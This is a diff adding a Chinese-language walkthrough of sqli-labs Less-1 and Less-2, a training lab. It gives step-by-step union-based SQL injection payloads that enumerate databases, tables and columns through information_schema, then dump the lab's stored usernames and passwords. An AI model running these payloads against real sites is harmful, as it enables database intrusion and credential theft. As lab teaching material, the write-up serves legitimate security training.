@@ -2357,3 +2357,182 @@ else:
 
 ------
 
+## [sqli-labs](https://github.com/Audi-1/sqli-labs)
+
+### Less-1
+
+本题小标题：**GET - Error based - Single quotes - String**。
+
+进入靶机后可以看到信息：
+
+> Please input the ID as parameter with numeric value
+
+1.**判断是否存在SQL注入点**
+
+输入`?id=1`可以看到有两行回显，分别是`Your Login name`和`Your Password`。
+
+输入`?id=1 and 1=1`依旧可以看到一样的两行回显，我们通过布尔条件测试说明存在注入点。
+
+2.**判断闭合字符，注释后面的内容**
+
+输入`?id=1'`可以看到信息：
+
+> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''-1'' LIMIT 0,1' at line 1
+
+`SQL`中采用`--`和`#`表示注释，可以使其后语句不会被执行。而**在GET请求传参注入时需要使用`--+`，`--%20`，`%23`来表示注释**，才能正常显示回显。
+
+输入`?id=1'--+` 或 `?id=1'--%20` 或 `?id=1'%23`都能照常看到两行回显内容，说明这是字符型SQL注入。
+
+3.**使用`order by`排序语句判断有几列数据**
+
+先随便写个数字来猜测有几行数据，输入`?id=1' order by 6%23` 看到以下信息，说明列数是小于6的。
+
+> Unknown column '6' in 'order clause'
+
+再依次尝试`5`，`4`，`3`，发现`5`和`4`的回显结果与上述信息相似，而`3`的回显内容正常，说明列数为3。
+
+4.**使用`union`联合查询语句判断显示位**
+
+先使`union`前面的内容为假，比如`?id=-1' union`，这样就只会显示`union`后面的内容查询结果。
+
+因为`union`前后查询的字段数量一样，所以后面的`select`需要输入三个字段，输入`?id=-1' union select 1,2,3%23`可以看到回显结果如下，只显示第`2`和第`3`列的数据。
+
+> Your Login name:2
+> Your Password:3
+
+5.**爆破数据库名**
+
+使用连接函数`group_concat()`将括号内字段的所有值以逗号作为分隔符连接成一行字符串打印显示。
+
+MySQL自带四个库，其中`information_schema`库下存放着数据库对象相关概要信息，比如字符集、引擎、数据库、数据表、视图、列、权限等，其中有重要的三个表，分别是：
+
+- `schemata`表：存放着MySQL数据库下所有库的信息，show databases命令的结果就是来自于这个表。此表有五列，分别为`catalog_name`、`schema_name`、`default_character_set_name`、`default_collation_name`、`sql_path`，其中`schema_name`列存储的是MySQL数据库下所有库的名字，在爆破数据库名时需要用到`schema_name`，一般是直接**使用`database()`字段查询当前数据库名称**。
+- `tables`表：提供关于数据库中表和视图的信息，有两个重要的列，`table_schema`是表所属数据库的名字，`table_name`是表的名字，在爆破表名时需要用到`table_name`。
+- `columns`表：提供表中列的信息，详细描述某表中的所有列以及每个列的信息，有三个重要的列，`table_schema`是所属数据库的名字，`table_name`是所属数据表的名字，`column_name`是字段的名字，在爆破字段名时需要用到`column_name`。
+
+输入`?id=-1' union select 1,database(),group_concat(schema_name) from information_schema.schemata%23`查询当前数据库名称并列举所有数据库名，回显信息如下，由此得知当前数据库名为`security`。
+
+> Your Login name:security
+> Your Password:ctftraining,information_schema,mysql,performance_schema,security,test
+
+6.**爆破数据表名**
+
+输入`?id=-1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema='security'%23`查询指定数据库`security`中的表信息。
+
+> Your Login name:security
+> Your Password:emails,referers,uagents,users
+
+发现有一个名为`users`的数据表，猜测其中存放着与用户相关的敏感信息。
+
+7.**爆破数据列名**
+
+输入`?id=-1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'%23`查询指定数据库`security`中的指定表`users`的所有列信息。
+
+> Your Login name:security
+> Your Password:id,username,password
+
+由此可知`username`和`password`是`users`表中的列信息。
+
+8.**爆破数据字段**
+
+输入`?id=-1' union select 1,group_concat(username),group_concat(password) from security.users%23`可以看到所有字段中的数据信息。
+
+> Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin
+> Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin
+
+知道管理员的用户名和密码后就能登录啦。
+
+------
+
+### Less-2
+
+本题小标题：**GET - Error based Intiger based**。
+
+进入靶机后可以看到信息：
+
+> Please input the ID as parameter with numeric value
+
+1.**判断是否存在SQL注入点**
+
+输入`?id=1`可以看到有两行回显，分别是`Your Login name`和`Your Password`。
+
+输入`?id=1 and 1=1`依旧可以看到一样的两行回显，我们通过布尔条件测试说明存在注入点。
+
+2.**判断闭合字符，注释后面的内容**
+
+输入`?id=1'`可以看到信息：
+
+> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''-1'' LIMIT 0,1' at line 1
+
+`SQL`中采用`--`和`#`表示注释，可以使其后语句不会被执行。而**在GET请求传参注入时需要使用`--+`，`--%20`，`%23`来表示注释**，才能正常显示回显。
+
+输入`?id=1'--+` 或 `?id=1'--%20` 或 `?id=1'%23`显示的结果都依旧是报错信息，说明这不是字符型注入，而是整数型SQL注入。
+
+> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''-- LIMIT 0,1' at line 1
+
+3.**使用`order by`排序语句判断有几列数据**
+
+先随便写个数字来猜测有几行数据，输入`?id=1 order by 6--+` 看到以下信息，说明列数是小于6的。
+
+> Unknown column '6' in 'order clause'
+
+再依次尝试`5`，`4`，`3`，发现`5`和`4`的回显结果与上述信息相似，而`3`的回显内容正常，说明列数为3。
+
+4.**使用`union`联合查询语句判断显示位**
+
+先使`union`前面的内容为假，比如`?id=-1 union`，这样就只会显示`union`后面的内容查询结果。
+
+因为`union`前后查询的字段数量一样，所以后面的`select`需要输入三个字段，输入`?id=-1 union select 1,2,3--+`可以看到回显结果如下，只显示第`2`和第`3`列的数据。
+
+> Your Login name:2
+> Your Password:3
+
+5.**爆破数据库**
+
+查询所有数据库：
+
+```sql
+?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata--+
+```
+
+> Your Login name:2
+> Your Password:ctftraining,information_schema,mysql,performance_schema,security,test
+
+查询当前数据库：
+
+```sql
+?id=-1 union select 1,2,database()--+
+```
+
+> Your Login name:2
+> Your Password:security
+
+查询指定数据库中的数据表信息：
+
+```sql
+?id=-1 union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema='security'--+
+```
+
+> Your Login name:security
+> Your Password:emails,referers,uagents,users
+
+查询指定数据表中的数据列信息：
+
+```sql
+?id=-1 union select 1,database(), group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'--+
+```
+
+> Your Login name:security
+> Your Password:id,username,password
+
+查询指定数据表中的数据字段信息：
+
+```sql
+?id=-1 union select 1,group_concat(username),group_concat(password) from security.users--+
+```
+
+> Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin
+> Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin
+
+------
+
